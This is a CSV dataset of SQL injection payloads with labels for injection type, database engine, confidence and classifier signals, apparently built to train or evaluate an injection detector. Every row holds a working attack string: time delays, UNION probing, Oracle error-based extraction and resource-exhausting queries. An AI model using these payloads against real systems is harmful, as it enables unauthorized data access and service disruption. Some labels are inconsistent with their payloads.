payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"1'+ ( select 'gjaq' where 5449 = 5449 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) ) +'",boolean_blind,postgresql,0.8,regexp_substring for boolean blind,KEEP,,boolean_blind,postgresql,1182,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1'+ ( select 'gjaq' where 5449 = 5449 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) ) +'"
"1'|| ( select 'ufgs' where 9670 = 9670 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) ||'",boolean_blind,generic,0.75,SELECT IF for boolean blind,KEEP,,boolean_blind,generic,1183,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1'|| ( select 'ufgs' where 9670 = 9670 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) ||'"
"-5032' or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",error_based,oracle,0.9,ctxsys.drithsx for Oracle error-based,KEEP,,error_based,oracle,1184,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"-5032' or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )"
"-5524 ) as eoyk where 6928 = 6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1185,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5524 ) as eoyk where 6928 = 6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--"
1' ) as gsjr where 7046 = 7046 and sleep ( 5 ) #,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1186,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1' ) as gsjr where 7046 = 7046 and sleep ( 5 ) #
"1' in boolean mode ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.85,randomblob() for time blind,KEEP,,time_blind,sqlite,1187,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1' in boolean mode ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
"1 union all select null,null,null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1188,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 union all select null,null,null,null,null,null,null,null--"
"-5247"" union all select 3097,3097,3097,3097,3097,3097,3097#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1189,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5247"" union all select 3097,3097,3097,3097,3097,3097,3097#"
"-3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1190,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--"
1'+ ( select ahyw where 6893 = 6893 waitfor delay '0:0:5'--,time_blind,mssql,0.9,waitfor delay for time blind,KEEP,,time_blind,mssql,1191,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,1'+ ( select ahyw where 6893 = 6893 waitfor delay '0:0:5'--
"1"" ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ""mmvu"" = ""mmvu",boolean_blind,generic,0.8,rlike() for boolean blind,KEEP,,boolean_blind,generic,1192,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)","1"" ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ""mmvu"" = ""mmvu"
select pg_sleep ( 5 ) and ( 'vnss' like 'vnss,time_blind,postgresql,0.9,pg_sleep() for time blind,KEEP,,time_blind,postgresql,1193,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,select pg_sleep ( 5 ) and ( 'vnss' like 'vnss
"1"" where 1166 = 1166",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1194,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" where 1166 = 1166"
"1%"" ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ""%"" = """,boolean_blind,generic,0.8,rlike() for boolean blind,KEEP,,boolean_blind,generic,1195,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)","1%"" ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( ""%"" = """
"1%"" and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ""%"" = """,boolean_blind,generic,0.75,SELECT IF for boolean blind,KEEP,,boolean_blind,generic,1196,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1%"" and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ""%"" = """
select ( case when ( 6204 = 1913 ) then 6204 else 6204* ( select 6204 from information_schema.character_sets ) end ) #,boolean_blind,mysql,0.8,CASE WHEN for boolean blind,KEEP,,boolean_blind,mysql,1197,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal,select ( case when ( 6204 = 1913 ) then 6204 else 6204* ( select 6204 from information_schema.character_sets ) end ) #
-7054 ) as gzvf where 9146 = 9146 or 3038 = 3038,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1198,boolean_blind,generic,Pattern match: 'or 3038 = 3038' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-7054 ) as gzvf where 9146 = 9146 or 3038 = 3038
1 ) ) ) and 6467 = 1864#,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,1199,boolean_blind,generic,Pattern match: 'and 6467 = 1864' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 ) ) ) and 6467 = 1864#
